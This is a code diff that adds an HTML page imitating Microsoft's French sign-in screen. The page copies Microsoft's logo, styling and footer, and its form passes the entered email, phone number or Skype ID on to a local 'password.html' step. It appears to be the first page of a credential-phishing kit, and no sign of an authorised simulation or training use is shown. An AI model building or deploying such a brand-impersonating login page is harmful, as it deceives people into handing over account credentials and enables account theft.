@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Se connecter à votre compte Microsoft</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+        }
+        body, html {
+            height: 100%;
+            min-height: 100vh;
+        }
+        body {
+            background: none;
+            position: relative;
+            min-height: 100vh;
+        }
+        .background-gradient {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            z-index: 0;
+            background: radial-gradient(circle at 20% 10%, #e7d6d1 0%, transparent 40%),
+                        radial-gradient(circle at 80% 10%, #dbe7d1 0%, transparent 40%),
+                        radial-gradient(circle at 50% 80%, #d1e0e7 0%, transparent 50%),
+                        #f3f6fb;
+            width: 100vw;
+            height: 100vh;
+        }
+        .main-content {
+            position: relative;
+            z-index: 1;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-box {
+            background: #fff;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.13);
+            border-radius: 2px;
+            width: 100%;
+            max-width: 440px;
+            padding: 40px 32px 32px 32px;
+            margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .ms-logo {
+            margin-bottom: 8px;
+        }
+        .ms-logo img {
+            height: 35px;
+            width: auto;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-top: 0;
+            margin-bottom: 20px;
+            color: #1b1b1b;
+        }
+        .input-group {
+            width: 100%;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: visible;
+        }
+        input[type="text"] {
+            width: 170%;
+            margin-left: 0%;
+            border: none;
+            border-bottom: 2px solid #666;
+            font-size: 16px;
+            padding: 8px 0 6px 0;
+            background: transparent;
+            color: #222;
+            transition: border-color 0.2s;
+        }
+        input[type="text"]:focus {
+            outline: none;
+            border-bottom: 2px solid #0067b8;
+        }
+        .input-underline {
+            display: none;
+        }
+        .links {
+            font-size: 14px;
+            color: #222;
+            margin-bottom: 24px;
+        }
+        .create-account {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        .account-access {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .account-access:hover {
+            text-decoration: underline;
+        }
+        .buttons {
+            width: 170%;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            margin-right: -35%;
+        }
+        .next-button {
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            padding: 8px 32px;
+            font-size: 15px;
+            font-weight: 400;
+            border-radius: 2px;
+            cursor: pointer;
+            height: 36px;
+            box-shadow: none;
+            transition: background 0.2s;
+        }
+        .next-button:hover {
+            background-color: #005a9e;
+        }
+        .options-connexion {
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto 0 auto;
+            background: #fff;
+            border: none;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.13);
+            border-radius: 2px;
+            padding: 14px 0 14px 0;
+            padding-left: 24px;
+            font-size: 16px;
+            color: #222;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 10px;
+            cursor: pointer;
+            margin-bottom: 0;
+        }
+        .options-connexion .icon-key {
+            width: 30px;
+            height: 30px;
+            margin-right: 20px;
+            filter: grayscale(1);
+        }
+        .options-connexion:hover {
+            background: #f3f6fb;
+        }
+        footer {
+            position: fixed;
+            left: 0; right: 0; bottom: 0;
+            width: 100vw;
+            background: transparent;
+            z-index: 2;
+            padding: 0 24px 8px 24px;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 24px;
+            font-size: 11px;
+            color: #666;
+        }
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-more {
+            font-size: 18px;
+            letter-spacing: 2px;
+            color: #666;
+            margin-left: 8px;
+        }
+        @media (max-width: 500px) {
+            .login-box, .options-connexion {
+                max-width: 98vw;
+                padding-left: 8px;
+                padding-right: 8px;
+            }
+            .footer-links {
+                flex-direction: column;
+                align-items: flex-end;
+                gap: 4px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-gradient"></div>
+    <div class="main-content">
+        <div class="login-box">
+            <div class="ms-logo">
+                <img src="logo-microsoft-scaled.jpg" alt="Microsoft Logo">
+            </div>
+            <h1>Se connecter</h1>
+            <form id="login-form" action="password.html" method="get">
+                <div class="input-group">
+                    <input type="text" id="email" name="user" placeholder="E-mail, téléphone ou identifiant Skype" required autocomplete="username">
+                </div>
+                <div class="links">
+                    <span>Pas de compte ? <a href="#" class="create-account">Créez-en un !</a></span><br>
+                    <a href="#" class="account-access">Votre compte n'est pas accessible ?</a>
+                </div>
+                <div class="buttons">
+                    <button type="submit" class="next-button">Suivant</button>
+                </div>
+            </form>
+        </div>
+        <button class="options-connexion">
+            <img src="signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.png" alt="clé" class="icon-key"> Options de connexion
+        </button>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <a href="#">Conditions d'utilisation</a>
+            <a href="#">Confidentialité et cookies</a>
+            <a href="#">Accessibilité : partiellement conforme</a>
+            <span class="footer-more">. . .</span>
+        </div>
+    </footer>
+</body>
+</html>
